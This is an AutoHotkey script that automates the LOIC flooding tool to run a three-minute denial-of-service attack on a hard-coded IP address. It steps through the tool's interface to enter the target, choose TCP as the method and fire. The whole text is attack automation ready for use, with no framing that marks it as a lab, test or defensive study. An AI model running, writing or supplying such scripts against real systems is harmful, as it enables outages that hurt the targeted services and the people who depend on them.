; === CONFIGURATION ===
targetIP := "205.174.165.68"
attackTime := 180000  ; 3 minutes in milliseconds

; === Launch LOIC ===
Run, C:\Path\To\LOIC.exe
WinWaitActive, LOIC

; === Input target IP ===
Send, %targetIP%
Send, {Tab 2}       ; Move to method (TCP/UDP/HTTP)
Send, {Down}        ; Choose method (e.g., TCP = first)

; === Start the attack ===
Send, {Tab 5}       ; Move to "IMMA CHARGIN MAH LAZER" button
Send, {Enter}

; === Wait for duration ===
Sleep, %attackTime%

; === Stop attack ===
Send, {Esc}         ; This usually stops LOIC, or:
WinClose, LOIC
